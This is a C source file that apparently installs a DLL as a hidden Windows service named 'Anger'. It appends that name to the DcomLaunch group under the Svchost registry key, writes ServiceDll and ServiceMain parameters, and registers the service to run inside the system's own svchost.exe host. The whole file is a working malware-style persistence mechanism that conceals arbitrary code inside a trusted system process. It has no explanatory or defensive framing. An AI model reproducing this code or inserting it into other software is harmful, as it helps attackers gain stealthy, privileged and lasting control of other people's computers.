#include "svchost.h"
#include "log.h"
#include "service.h"

LRESULT AddSvchostKeyValue(PTSTR pszName)
{
	HKEY	hKey;
	LSTATUS lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		_T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost"), 0, KEY_ALL_ACCESS, &hKey);
	if (lResult != ERROR_SUCCESS)
	{
		LogError(_T("Error 0x%.08X\r\n"), lResult);

		return lResult;
	}

	DWORD	cbValues;

	lResult = RegQueryValueEx(hKey, _T("DcomLaunch"), NULL, NULL, NULL, &cbValues);
	if (lResult != ERROR_SUCCESS)
	{
		return lResult;
	}

	LPTSTR lpValues = (LPTSTR)malloc(cbValues);
	if (lpValues == NULL)
	{
		LogError(_T("Error 0x%.08X\r\n"), GetLastError());

		return lResult;
	}

	lResult = RegQueryValueEx(hKey, _T("DcomLaunch"), NULL, NULL, (LPBYTE)lpValues, &cbValues);
	if (lResult != ERROR_SUCCESS)
	{
		return lResult;
	}

	DWORD cbNewValues = cbValues + (lstrlen(pszName) + 1) * sizeof(TCHAR);

	LPTSTR	lpNewValues = (LPTSTR)malloc(cbNewValues);
	if (lpNewValues == NULL)
	{
		LogError(_T("Error 0x%.08X\r\n"), GetLastError());

		return lResult;
	}

	ZeroMemory(lpNewValues, cbNewValues);

	memcpy_s(lpNewValues, cbNewValues, lpValues, cbValues - 1);
	memcpy_s((PBYTE)lpNewValues + cbValues - 1 * sizeof(TCHAR), cbNewValues - cbValues + 1, pszName, (lstrlen(pszName) + 1) * sizeof(TCHAR));

	lResult = RegSetValueEx(hKey, _T("DcomLaunch"), NULL, REG_MULTI_SZ, (LPBYTE)lpNewValues, cbNewValues);
	if (lResult != ERROR_SUCCESS)
	{
		LogError(_T("Error 0x%.08X\r\n"), GetLastError());

		return lResult;
	}

	if (lpValues != NULL)
	{
		free(lpValues);
	}

	if (lpNewValues != NULL)
	{
		free(lpNewValues);
	}

	RegCloseKey(hKey);

	return lResult;
}

LRESULT AddSvchostServiceParam(PTSTR pszServiceName, PTSTR pszPath)
{
	LRESULT lResult;
	HKEY	hKey;

	lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Services"), 0, KEY_ALL_ACCESS, &hKey);
	if (lResult == ERROR_SUCCESS)
	{
		HKEY	hServiceKey;

		lResult = RegOpenKeyEx(hKey, pszServiceName, 0, KEY_ALL_ACCESS, &hServiceKey);
		if (lResult == ERROR_SUCCESS)
		{
			lResult = RegSetKeyValue(hServiceKey, _T("Parameters"), _T("ServiceDll"), REG_EXPAND_SZ, pszPath, (lstrlen(pszPath) + 1) * sizeof(TCHAR));
			if (lResult == ERROR_SUCCESS)
			{
				lResult = RegSetKeyValue(hServiceKey, _T("Parameters"), _T("ServiceMain"), REG_SZ, _T("ServiceMain"), (lstrlen(_T("ServiceMain")) + 1) * sizeof(TCHAR));

				RegCloseKey(hServiceKey);
			}
			else
			{
				RegCloseKey(hServiceKey);
			}
		}
	}
	RegCloseKey(hKey);

	return lResult;
}

DWORD_PTR InstallSvchost(LPTSTR pszInstallPath)
{
	DWORD_PTR	dwRet;

	dwRet = AddSvchostKeyValue(_T("Anger"));
	if (dwRet == ERROR_SUCCESS)
	{
		dwRet = AddSvchostServiceParam(_T("Anger"), pszInstallPath);
		if (dwRet == ERROR_SUCCESS)
		{
			dwRet = DoInstallSvc(_T("%SystemRoot%\\system32\\svchost.exe -k DcomLaunch"));
		}
	}

	return dwRet;
}